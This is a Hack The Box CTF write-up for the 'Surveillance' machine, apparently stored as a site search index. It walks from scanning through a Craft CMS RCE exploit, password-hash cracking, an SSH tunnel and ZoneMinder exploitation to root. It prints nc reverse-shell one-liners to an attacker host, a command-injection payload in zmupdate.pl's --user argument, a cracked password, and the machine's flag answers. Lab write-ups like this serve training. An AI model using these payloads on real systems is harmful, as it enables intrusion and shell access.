{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Surveillance","text":"<p>Written on: 29/3/2024                                                                                                                time0ut</p> Difficulty Location Operating System Total number of Tasks Day started Day completed Medium Machines Linux 2 6/1/2024 22/3/2024"},{"location":"#step-1-scanning-and-enumeration","title":"Step 1: Scanning and Enumeration","text":"<p>The first thing we always do when facing a machine is to scan for open ports using nmap</p> <p><code>sudo nmap -sS -sV 192.168.0.1</code></p> <p></p> <p>As you can see, port 22 (SSH) and port 80 (HTTP) are both open.</p> <p>Let\u2019s check out port 80 first. Just go to any browser</p> <p><code>http://192.168.0.1</code></p> <p></p> <p>As you can see, we couldn\u2019t connect to the server. To fix this, we will need to modify our <code>/etc/hosts</code> file</p> <p><code>sudo nano /etc/hosts</code></p> <p>Add in the last line</p> <p></p> <p>Save the file and if you refresh the page again, it should work.</p> <p></p> <p>So, before we explore the page, let\u2019s do some subdomain discovery using gobuster</p> <p><code>gobuster dns -d surveillance.htb -w /usr/share/wordlists/dirb/common.txt</code></p> <p></p> <p>As you can see, nothing. Now, let\u2019s brute force directories using gobuster again</p> <p><code>gobuster dir -u http://surveillance.htb/ -w /usr/share/wordlists/dirb/common.txt</code></p> <p></p> <p>Finally, some results. Hmm\u2026 there seem to be a <code>/admin</code> directory. Let\u2019s check it out!</p> <p><code>http://surveillance.htb/admin</code></p> <p></p>"},{"location":"#step-2-initial-foothold","title":"Step 2: Initial Foothold","text":"<p>As you can see, the server is using craft cms. Let\u2019s search online and see if there are any exploits related to it.</p> <p></p> <p>Bingo! Multiple PoC on RCE. I will be trying out the PoC on the second link</p> <p></p> <p>Woah that was easy\u2026 however, the shell is so unstable that if I try to stabilize it, it will hang there.</p> <p></p> <p>However, it can still handle some basic command but I can just do it on the web shell.</p> <p></p> <p>Looking at the printed text, we can see that a web shell is deployed in the <code>/admin/shell.php?cmd=</code> directory. So\u2026 let\u2019s try it out!</p> <p></p> <p>Hmm\u2026 so what can we do with this? Let\u2019s try to make a reverse shell to connect to our host machine to make our lives easier. </p> <p>I am going to use the shell in the command prompt instead of the web shell.</p> <p>Firstly, we set up a listener using netcat</p> <p><code>nc -nvlp 4444</code></p> <p></p> <p>Next, we put in this command to have a reverse shell</p> <p><code>rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc &lt;host_ip&gt; 4444 &gt;/tmp/f</code></p> <p></p> <p>As you can see, it just hangs there, however, if you look at your netcat listener, you will see that a connection was made</p> <p></p>"},{"location":"#step-3-initial-access","title":"Step 3: Initial Access","text":"<p>The first thing I did was to stabilize the shell</p> <p><code>python3 -c 'import pty; pty.spawn(\"/bin/sh\")'</code></p> <p></p> <p>Now, let\u2019s do some basic enumeration</p> <p><code>pwd</code></p> <p><code>whoami</code></p> <p></p> <p>Hmm\u2026 nothing useful. How about the users that exists in this machine</p> <p><code>ls -la /home</code></p> <p></p> <p>As you can see, there are 2 user, matthew and zoneminder.</p> <p>After exploring the machine for some time, I found an interesting file that might be useful located in <code>/var/www/html/craft/storage/backups</code></p> <p></p> <p>Let\u2019s try to get this file out so we can unzip it.</p> <p>Firstly, I copy the file in the <code>/storage/backups</code> directory to <code>/web</code> directory. This is because the /web directory is the folder that is public facing.</p> <p><code>cp /var/www/html/craft/storage/backups/surveillance--2023-10-17-202801--v4.4.14.sql.zip /var/www/html/craft/web/surveillance--2023-10-17-202801--v4.4.14.sql.zip</code></p> <p>After moving it, we can just use the wget command to get the file</p> <p><code>wget http://surveillance.htb/surveillance--2023-10-17-202801--v4.4.14.sql.zip</code></p> <p></p> <p>Now we just unzip it</p> <p><code>unzip surveillance--2023-10-17-202801--v4.4.14.sql.zip</code></p> <p></p> <p>After reading the file</p> <p><code>cat surveillance--2023-10-17-202801--v4.4.14.sql</code></p> <p>I found Matthew\u2019s hashed password</p> <p></p> <p>Let\u2019s crack it</p> <p>First, we put the hash into a file</p> <p><code>echo '39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec' &gt; hash.txt</code></p> <p>Next, we identify the hash using hash-identifier</p> <p></p> <p>Finally, we use hashcat to crack it <code>hashcat -m 1400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</code></p> <p></p> <p>Here we go! Matthew\u2019s password.</p> <p>Now, we can just SSH into the machine using Matthew\u2019s account</p> <p><code>Username: matthew</code></p> <p><code>Password: starcraft122490</code></p> <p><code>ssh matthew@192.168.0.1</code></p> <p></p> <p>And if you look at the Matthew\u2019s home directory, the user flag is there</p> <p><code>ls</code> </p> <p><code>cat user.txt</code></p> <p></p>  \ud83d\udca1 Submit User Flag   <p>Answer: 00eb42c67f8fc185488719ea964eea14</p>"},{"location":"#step-4-privilege-escalation","title":"Step 4: Privilege Escalation","text":"<p>The first thing I always do for privilege escalation is <code>sudo -l</code></p> <p></p> <p>Of course the privilege escalation part wouldn\u2019t be so direct</p> <p>The next thing I did was <code>uname -a</code> to check for existing kernel exploit\u2026 unfortunately after trying out one PoC, it didn\u2019t work.</p> <p>Before I start exploring the machine, I will upload linpeas and run it</p> <p><code>http -m http.server 4444</code></p> <p><code>wget http://&lt;host_ip&gt;:4444/linpeas.sh</code></p> <p></p> <p>Nice we got it into the victim\u2019s machine. Now let\u2019s run it</p> <p><code>chmod +x linpeas.sh</code></p> <p><code>./linpeas.sh</code></p> <p>Just wait for it to finish running and you can start looking at the \u2018report\u2019</p> <p>One of the thing that caught my attention was this password (zoneminder\u2019s password) for some software</p> <p></p> <p>Another thing that caught my attention is this</p> <p></p> <p>It seems to be a database username and password</p> <p>Lastly, this caught my attention as well</p> <p></p> <p>There seems to be a internal website</p> <p>So why not we try to access that internal website</p> <p><code>ssh -L 2222:127.0.0.1:8080 matthew@192.168.0.1</code></p> <p>This command will establish a SSH tunnel with port forwarding. When this command is run and the user is authenticated on the server, a secure tunnel will be established between your local machine and the remote server. Any traffic sent to your local host port 2222 will be forwarded to port 8080 on the remote server.</p> <p>Therefore, if you go to your browser and enter</p> <p><code>http://localhost:2222</code></p> <p></p> <p>You will see that we have successfully access an internal website</p> <p>The first thing I did was to check for existing exploits</p> <p></p> <p>I will be using the first PoC</p> <p><code>python3 exploit.py -t http://127.0.0.1:2222 -ip &lt;host_ip&gt; -p 4444</code></p> <p>Before we run this command, we need to set up a netcat listener</p> <p><code>nc -nvlp 4444</code></p> <p></p> <p>As you can see, it hangs there. However, if you look at your netcat listener, you will see that we are connected</p> <p></p> <p>Again, we first stabilize the shell</p> <p><code>python3 -c 'import pty; pty.spawn(\"/bin/sh\")'</code></p> <p></p> <p>Now, some basic enumeration</p> <p><code>whoami</code></p> <p><code>pwd</code></p> <p></p> <p>Hmm\u2026 this time we are login as zoneminder. Let\u2019s look at his home directory first</p> <p><code>cd /home/zoneminder; ls</code></p> <p></p> <p>Woah\u2026 empty! Let\u2019s try <code>sudo -l</code> again</p> <p></p> <p>Bingo! The user zoneminder is able to run all files in <code>/usr/bin</code> that starts with <code>zm</code> and end with <code>.pl</code> without password. Let\u2019s check out the files there.</p> <p><code>cd /use/bin; ls -la</code></p> <p></p> <p>\u2026 there\u2019s actually a lot of files here bruh. I actually look through all the files to see if there are any way to privilege escalate (yes it took a long time)</p> <p>I found out that the <code>zmupdate.pl</code> file is actually vulnerable. If you enter this line of command, you will actually get a root shell (I still haven\u2019t figure it out why and how)</p> <p><code>sudo /usr/bin/zmupdate.pl --version=1 --user='$(/bin/bash -i)' --pass=ZoneMinderPassword2023</code></p> <p></p> <p>Now that we are in the root account. However, if you try to run any command, you will realise that the shell is buggy.</p> <p></p> <p>So now instead of executing a command in the user parameter, I will execute a file where it is a reverse shell for our host. </p> <p>Since we cannot create any file in the current directory, we will need to go to the tmp directory first</p> <p><code>cd /tmp</code></p> <p>Then, we will create a file and make it an executable</p> <p><code>echo '#!/bin/bash\\nbusybox nc 10.10.14.85 7777 -e sh' &gt; busy.sh</code></p> <p><code>chmod +x busy.sh</code></p> <p>Finally, before run the command, we start a <code>netcat</code> listener on our host</p> <p><code>nc -nvlp 7777</code></p> <p>Now run the command</p> <p><code>sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/busy.sh)' --pass=ZoneMinderPassword2023</code></p> <p></p> <p>As you can see, it hangs there. However, if you look at your netcat lisenter, you will see that a connection is made</p> <p></p> <p>And now if you check the user, it should be root</p> <p><code>whoami</code></p> <p></p> <p>Bingo! Now all we need to do is to get the root flag</p> <p><code>cd /root; cat root.txt</code></p> <p></p> <p>Viola! There you have it, the root flag!</p>  \ud83d\udca1 Submit Root Flag   <p>Answer: dd48e305d386dcf9cc15c53d668d8829</p> Text Only<pre><code>                                                                    ~ End ~\n</code></pre>"}]}